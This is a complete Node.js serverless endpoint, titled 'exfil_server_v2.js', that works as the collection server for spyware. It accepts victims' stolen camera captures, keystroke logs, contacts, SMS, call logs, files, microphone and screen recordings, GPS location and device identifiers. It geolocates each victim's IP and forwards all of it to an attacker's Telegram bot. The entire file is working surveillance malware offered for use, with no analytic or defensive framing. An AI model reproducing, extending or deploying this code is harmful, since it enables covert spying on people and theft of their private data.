// exfil_server_v2.js – Complete with all handlers + fixes
import fs from 'fs';
import path from 'path';
import os from 'os';
import FormData from 'form-data';
import fetch from 'node-fetch';
import archiver from 'archiver';

// Increase body size limit (Vercel/Next.js API)
export const config = {
    api: {
        bodyParser: {
            sizeLimit: '50mb'
        }
    }
};

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { type, data, fingerprint, metadata } = req.body;
    if (!type) return res.status(400).json({ error: 'Missing type' });

    // Load bot config from files (external)
    let BOT_TOKEN, CHAT_ID;
    try {
        const root = process.cwd();
        BOT_TOKEN = fs.readFileSync(path.join(root, 'token.txt'), 'utf8').trim();
        CHAT_ID = fs.readFileSync(path.join(root, 'uid.txt'), 'utf8').trim();
    } catch (e) {
        return res.status(500).json({ error: 'Bot config missing: ' + e.message });
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const geo = await getGeo(ip);
    const f = fingerprint || {};

    try {
        // Route to appropriate handler
        switch (type) {
            case 'image':
                return await handleImage(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f, metadata });
            case 'video':
                return await handleVideo(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f, metadata });
            case 'contacts':
                return await handleContacts(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'files':
                return await handleFiles(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'keylog':
                return await handleKeylog(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'screenrecord':
                return await handleScreenRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'calls':
                return await handleCallLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'sms':
                return await handleSMSLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'location':
                return await handleLocation(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'mic':
                return await handleMicRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'apps':
                return await handleInstalledApps(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'wifi':
                return await handleWiFiNetworks(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            case 'deviceinfo':
                return await handleDeviceInfo(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f });
            default:
                return res.status(400).json({ error: 'Invalid type' });
        }
    } catch (e) {
        console.error('Handler error:', e);
        return res.status(500).json({ error: e.message });
    }
}

// ---------- MEDIA HANDLERS ----------

async function handleImage(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f, metadata }) {
    const imageData = req.body.data;
    if (!imageData) throw new Error('No image data');

    const caption = generateCaption({
        type: 'image',
        ip,
        geo,
        f,
        extra: `📸 <b>Image capture</b> (${metadata?.videoIndex !== undefined ? `Video #${metadata.videoIndex+1}` : 'Standalone'})`
    });

    const buffer = Buffer.from(imageData.replace(/^data:image\/\w+;base64,/, ''), 'base64');
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendPhoto', form);
    res.status(200).json({ status: 'ok' });
}

async function handleVideo(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f, metadata }) {
    const videoData = req.body.data;
    if (!videoData) throw new Error('No video data');

    const mimeType = metadata?.mimeType || 'video/mp4';
    const ext = mimeType === 'video/mp4' ? 'mp4' : 'webm';
    const videoIndex = metadata?.videoIndex !== undefined ? metadata.videoIndex : 0;

    const caption = generateCaption({
        type: 'video',
        ip,
        geo,
        f,
        extra: `🎥 <b>Video capture</b> #${videoIndex+1} (${ext})`
    });

    const buffer = Buffer.from(videoData, 'base64');
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', buffer, { filename: `capture_${videoIndex}.${ext}`, contentType: mimeType });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    form.append('supports_streaming', 'true');

    await sendToTelegram(BOT_TOKEN, 'sendVideo', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- CONTACTS HANDLER ----------

async function handleContacts(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const contacts = req.body.data;
    if (!contacts) throw new Error('No contacts data');

    const caption = generateCaption({
        type: 'contacts',
        ip,
        geo,
        f,
        extra: `👥 <b>Contacts:</b> ${contacts.length}\n` +
               `📇 <b>Sample:</b>\n${contacts.slice(0, 3).map(c =>
                   `• ${c.name}: ${c.phone}${c.email ? ` (${c.email})` : ''}`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(contacts, null, 2)), { filename: 'contacts.json' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- FILES HANDLER (ZIP) ----------

async function handleFiles(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { files, directory } = req.body.data;
    if (!files) throw new Error('No files data');

    const caption = generateCaption({
        type: 'files',
        ip,
        geo,
        f,
        extra: `📁 <b>Directory:</b> ${directory}\n` +
               `📄 <b>Files:</b> ${files.length}\n` +
               `🔍 <b>Sample:</b>\n${files.slice(0, 3).map(file =>
                   `• ${file.name} (${formatBytes(file.size)})`).join('\n')}`
    });

    // Use os.tmpdir() for safe temporary directory
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'exfil-'));
    const zipPath = path.join(tempDir, 'files.zip');
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip');

    await new Promise((resolve, reject) => {
        archive.pipe(output);
        files.forEach(file => {
            archive.append(Buffer.from(file.content, 'base64'), { name: file.name });
        });
        archive.finalize();
        output.on('close', resolve);
        archive.on('error', reject);
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', fs.createReadStream(zipPath), { filename: 'files.zip' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    fs.unlinkSync(zipPath);
    fs.rmdirSync(tempDir);
    res.status(200).json({ status: 'ok' });
}

// ---------- KEYLOG HANDLER ----------

async function handleKeylog(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { logs, duration } = req.body.data;
    if (!logs) throw new Error('No keylog data');

    const caption = generateCaption({
        type: 'keylog',
        ip,
        geo,
        f,
        extra: `⌨️ <b>Keylog Duration:</b> ${duration} minutes\n` +
               `📝 <b>Total Keystrokes:</b> ${logs.length}\n` +
               `🔍 <b>Sample:</b>\n${logs.slice(0, 20).join(' ')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(logs.join('\n')), { filename: 'keylog.txt' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- SCREEN RECORD HANDLER ----------

async function handleScreenRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { video, duration, mimeType } = req.body.data;
    if (!video) throw new Error('No video data');

    const caption = generateCaption({
        type: 'screenrecord',
        ip,
        geo,
        f,
        extra: `🎬 <b>Screen Recording:</b> ${duration} seconds\n` +
               `📱 <b>Resolution:</b> ${f.screen || 'Unknown'}`
    });

    const buffer = Buffer.from(video, 'base64');
    const ext = mimeType === 'video/mp4' ? 'mp4' : 'webm';

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', buffer, { filename: `screenrecord.${ext}`, contentType: mimeType });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    form.append('supports_streaming', 'true');

    await sendToTelegram(BOT_TOKEN, 'sendVideo', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- CALL LOGS HANDLER ----------

async function handleCallLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const calls = req.body.data;
    if (!calls) throw new Error('No call logs');

    const caption = generateCaption({
        type: 'calls',
        ip,
        geo,
        f,
        extra: `📞 <b>Call Logs:</b> ${calls.length} entries\n` +
               `🔍 <b>Sample:</b>\n${calls.slice(0, 3).map(c =>
                   `• ${c.number} (${c.type}) - ${c.duration}s`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(calls, null, 2)), { filename: 'calls.json' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- SMS LOGS HANDLER ----------

async function handleSMSLogs(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const messages = req.body.data;
    if (!messages) throw new Error('No SMS data');

    const caption = generateCaption({
        type: 'sms',
        ip,
        geo,
        f,
        extra: `💬 <b>SMS Logs:</b> ${messages.length} messages\n` +
               `🔍 <b>Sample:</b>\n${messages.slice(0, 3).map(m =>
                   `• ${m.number}: ${m.body.substring(0, 30)}...`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(messages, null, 2)), { filename: 'sms.json' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- LOCATION HANDLER ----------

async function handleLocation(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { latitude, longitude, accuracy, timestamp } = req.body.data;
    if (!latitude || !longitude) throw new Error('No location data');

    const caption = generateCaption({
        type: 'location',
        ip,
        geo,
        f,
        extra: `📍 <b>Location:</b> https://www.google.com/maps?q=${latitude},${longitude}\n` +
               `🎯 <b>Accuracy:</b> ${accuracy}m\n` +
               `⏱️ <b>Timestamp:</b> ${new Date(timestamp).toLocaleString()}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('latitude', latitude);
    form.append('longitude', longitude);
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendLocation', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- MICROPHONE RECORD HANDLER ----------

async function handleMicRecord(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const { audio, duration, mimeType } = req.body.data;
    if (!audio) throw new Error('No audio data');

    const caption = generateCaption({
        type: 'mic',
        ip,
        geo,
        f,
        extra: `🎤 <b>Microphone Recording:</b> ${duration} seconds\n` +
               `🔊 <b>Format:</b> ${mimeType}`
    });

    const buffer = Buffer.from(audio, 'base64');
    const ext = mimeType === 'audio/mp3' ? 'mp3' : 'ogg';

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('audio', buffer, { filename: `mic.${ext}`, contentType: mimeType });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendAudio', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- INSTALLED APPS HANDLER ----------

async function handleInstalledApps(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const apps = req.body.data;
    if (!apps) throw new Error('No apps data');

    const caption = generateCaption({
        type: 'apps',
        ip,
        geo,
        f,
        extra: `📱 <b>Installed Apps:</b> ${apps.length}\n` +
               `🔍 <b>Sample:</b>\n${apps.slice(0, 5).map(a =>
                   `• ${a.name} (${a.package})`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(apps, null, 2)), { filename: 'apps.json' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- WIFI NETWORKS HANDLER ----------

async function handleWiFiNetworks(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const networks = req.body.data;
    if (!networks) throw new Error('No WiFi data');

    const caption = generateCaption({
        type: 'wifi',
        ip,
        geo,
        f,
        extra: `📶 <b>WiFi Networks:</b> ${networks.length}\n` +
               `🔍 <b>Sample:</b>\n${networks.slice(0, 3).map(n =>
                   `• ${n.ssid} (${n.security}) - ${n.strength}dBm`).join('\n')}`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(networks, null, 2)), { filename: 'wifi.json' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- DEVICE INFO HANDLER ----------

async function handleDeviceInfo(req, res, { BOT_TOKEN, CHAT_ID, ip, geo, f }) {
    const info = req.body.data;
    if (!info) throw new Error('No device info');

    const caption = generateCaption({
        type: 'deviceinfo',
        ip,
        geo,
        f,
        extra: `📱 <b>Device Info:</b>\n` +
               `• <b>Model:</b> ${info.model}\n` +
               `• <b>OS:</b> ${info.os} (${info.osVersion})\n` +
               `• <b>Manufacturer:</b> ${info.manufacturer}\n` +
               `• <b>IMEI:</b> ${info.imei || 'N/A'}\n` +
               `• <b>Serial:</b> ${info.serial || 'N/A'}\n` +
               `• <b>Storage:</b> ${info.storage} (${info.freeStorage} free)\n` +
               `• <b>RAM:</b> ${info.ram} (${info.freeRam} free)`
    });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', Buffer.from(JSON.stringify(info, null, 2)), { filename: 'deviceinfo.json' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');

    await sendToTelegram(BOT_TOKEN, 'sendDocument', form);
    res.status(200).json({ status: 'ok' });
}

// ---------- HELPER FUNCTIONS ----------

async function getGeo(ip) {
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        return await geoRes.json();
    } catch (e) {
        return { status: 'fail', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
    }
}

function generateCaption({ type, ip, geo, f, extra = '' }) {
    const typeIcons = {
        'image': '📸', 'video': '🎥', 'contacts': '👥', 'files': '📁',
        'keylog': '⌨️', 'screenrecord': '🎬', 'calls': '📞', 'sms': '💬',
        'location': '📍', 'mic': '🎤', 'apps': '📱', 'wifi': '📶', 'deviceinfo': 'ℹ️'
    };

    return `📡 <b>NEW ${type.toUpperCase()}</b> ${typeIcons[type] || '📌'}\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `📞 <b>Phone:</b> ${f.phone || 'N/A'}\n` +
           `🌐 <b>IP:</b> <code>${ip}</code>\n` +
           `📍 <b>Location:</b> ${geo.country ? `${geo.country}, ${geo.city}` : 'Unknown'} (${geo.isp || 'ISP Unknown'})\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `${extra}\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `🕒 <b>Captured:</b> ${new Date().toLocaleString()}\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `🎯 <b>Credits:</b> @cyber_sniper`;
}

// Fixed sendToTelegram – now receives BOT_TOKEN as first argument
async function sendToTelegram(token, endpoint, form) {
    const response = await fetch(`https://api.telegram.org/bot${token}/${endpoint}`, {
        method: 'POST',
        body: form
    });
    const data = await response.json();
    if (!response.ok) throw new Error(`Telegram: ${data.description}`);
    return data;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}
